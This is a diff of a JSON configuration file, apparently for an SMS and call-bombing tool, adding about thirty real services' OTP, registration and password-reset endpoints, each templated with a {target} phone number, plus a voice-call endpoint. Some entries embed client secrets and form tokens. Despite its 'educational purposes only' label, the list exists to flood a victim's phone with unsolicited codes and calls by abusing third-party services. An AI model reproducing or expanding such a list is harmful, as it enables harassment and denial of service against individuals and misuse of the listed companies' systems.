@@ -1,7 +1,7 @@
 {
-    "contributors": ["Kai"],
-    "version": "3.0",
-    "description": "Updated with working OTP services ",
+    "contributors": ["Kai", "Security Researchers"],
+    "version": "4.0",
+    "description": "Comprehensive OTP services - For educational purposes only",
     "sms": {
         "91": [
             {
@@ -529,6 +529,324 @@
                     "phone": "+{cc}{target}"
                 },
                 "identifier": "success"
+            },
+            {
+                "name": "pizzahut_ru",
+                "method": "POST",
+                "url": "https://pizzahut.ru/account/password-reset",
+                "data": {
+                    "reset_by": "phone",
+                    "action_id": "pass-recovery",
+                    "phone": "{target}",
+                    "_token": "*"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "rabota_ru",
+                "method": "POST",
+                "url": "https://www.rabota.ru/remind",
+                "data": {
+                    "credential": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "comfy_ua",
+                "method": "POST",
+                "url": "https://comfy.ua/ua/customer/account/createPost",
+                "data": {
+                    "registration_name": "{name}",
+                    "registration_phone": "{target}",
+                    "registration_email": "{email}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "rutube",
+                "method": "POST",
+                "url": "https://rutube.ru/api/accounts/sendpass/phone",
+                "data": {
+                    "phone": "+{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "allo_ua",
+                "method": "POST",
+                "url": "https://allo.ua/ua/customer/account/createPostVue/",
+                "data": {
+                    "firstname": "{name}",
+                    "telephone": "{target}",
+                    "email": "{email}",
+                    "password": "{password}",
+                    "form_key": "Zqqj7CyjkKG2ImM8"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "citilink",
+                "method": "GET",
+                "url": "https://www.citilink.ru/registration/confirm/phone/+{target}/",
+                "identifier": "success"
+            },
+            {
+                "name": "sportmaster",
+                "method": "GET",
+                "url": "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{target}",
+                "identifier": "success"
+            },
+            {
+                "name": "oyorooms",
+                "method": "GET",
+                "url": "https://www.oyorooms.com/api/pwa/generateotp",
+                "params": {
+                    "phone": "+{target}",
+                    "country_code": "+{cc}",
+                    "nod": "4",
+                    "locale": "en"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "online_ua",
+                "method": "GET",
+                "url": "https://secure.online.ua/ajax/check_phone/",
+                "params": {
+                    "reg_phone": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "pampik",
+                "method": "POST",
+                "url": "https://pampik.com/callback",
+                "data": {
+                    "phoneCallback": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "mobileplanet",
+                "method": "POST",
+                "url": "https://mobileplanet.ua/register",
+                "data": {
+                    "klient_name": "{name}",
+                    "klient_phone": "+{target}",
+                    "klient_email": "{email}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "tinkoff",
+                "method": "POST",
+                "url": "https://api.tinkoff.ru/v1/sign_up",
+                "data": {
+                    "phone": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "youla",
+                "method": "POST",
+                "url": "https://youla.ru/web-api/auth/request_code",
+                "data": {
+                    "phone": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "icq",
+                "method": "POST",
+                "url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
+                "data": {
+                    "msisdn": "{target}",
+                    "locale": "en",
+                    "countryCode": "ru",
+                    "version": "1",
+                    "k": "ic1rtwz1s1Hj1O0r",
+                    "r": "46763"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "indriver",
+                "method": "POST",
+                "url": "https://terra-1.indriverapp.com/api/authorization",
+                "data": {
+                    "mode": "request",
+                    "phone": "+{target}",
+                    "phone_permission": "unknown",
+                    "stream_id": 0,
+                    "v": 3,
+                    "appversion": "3.20.6",
+                    "osversion": "unknown",
+                    "devicemodel": "unknown"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "ivi",
+                "method": "POST",
+                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
+                "data": {
+                    "phone": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "cloud_mail",
+                "method": "POST",
+                "url": "https://cloud.mail.ru/api/v2/notify/applink",
+                "json": {
+                    "phone": "+{target}",
+                    "api": 2,
+                    "email": "email",
+                    "x-email": "x-email"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "plink",
+                "method": "POST",
+                "url": "https://plink.tech/register/",
+                "json": {
+                    "phone": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "kasta",
+                "method": "POST",
+                "url": "https://kasta.ua/api/v2/login/",
+                "data": {
+                    "phone": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "eda_yandex",
+                "method": "POST",
+                "url": "https://eda.yandex/api/v1/user/request_authentication_code",
+                "json": {
+                    "phone_number": "+{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "ozon",
+                "method": "POST",
+                "url": "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
+                "json": {
+                    "phone": "{target}",
+                    "otpId": 0
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "okru",
+                "method": "POST",
+                "url": "https://ok.ru/dk",
+                "data": {
+                    "st.r.phone": "+{target}",
+                    "cmd": "AnonymRegistrationEnterPhone",
+                    "st.cmd": "anonymRegistrationEnterPhone"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "lenta",
+                "method": "POST",
+                "url": "https://lenta.com/api/v1/authentication/requestValidationCode",
+                "json": {
+                    "phone": "+{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "findclone",
+                "method": "GET",
+                "url": "https://findclone.ru/register",
+                "params": {
+                    "phone": "+{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "delitime",
+                "method": "POST",
+                "url": "https://api.delitime.ru/api/v2/signup",
+                "data": {
+                    "SignupForm[username]": "{target}",
+                    "SignupForm[device_type]": 3
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "carsmile",
+                "method": "POST",
+                "url": "https://api.carsmile.com/",
+                "json": {
+                    "operationName": "enterPhone",
+                    "variables": {
+                        "phone": "{target}"
+                    },
+                    "query": "mutation enterPhone($phone: String!) { enterPhone(phone: $phone) }"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "qiwi",
+                "method": "POST",
+                "url": "https://mobile-api.qiwi.com/oauth/authorize",
+                "data": {
+                    "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
+                    "username": "{target}",
+                    "client_id": "android-qw",
+                    "client_secret": "zAm4FKq9UnSe7id"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "eldorado",
+                "method": "GET",
+                "url": "https://api.eldorado.ua/v1/sign",
+                "params": {
+                    "login": "{target}",
+                    "step": "phone-check",
+                    "fb_id": "null",
+                    "fb_token": "null",
+                    "lang": "ru"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "twitch",
+                "method": "POST",
+                "url": "https://passport.twitch.tv/register",
+                "json": {
+                    "birthday": {
+                        "day": 17,
+                        "month": 10,
+                        "year": 1998
+                    },
+                    "client_id": "qb1unb4b2q4t58fwldcbz2nnm46a8zp",
+                    "include_verification_code": true,
+                    "password": "{password}",
+                    "phone_number": "{target}",
+                    "username": "{name}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "cian",
+                "method": "POST",
+                "url": "https://api.cian.ru/sms/v1/send-validation-code/",
+                "json": {
+                    "phone": "+{target}",
+                    "type": "authenticateCode"
+                },
+                "identifier": "success"
             }
         ]
     },
@@ -605,6 +923,17 @@
                 "json": {
                     "phone": "+{cc}{target}",
                     "method": "voice"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "sipnet",
+                "method": "GET",
+                "url": "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
+                "params": {
+                    "phone": "+{target}",
+                    "callmode": "1",
+                    "oper": "9"
                 },
                 "identifier": "success"
             }
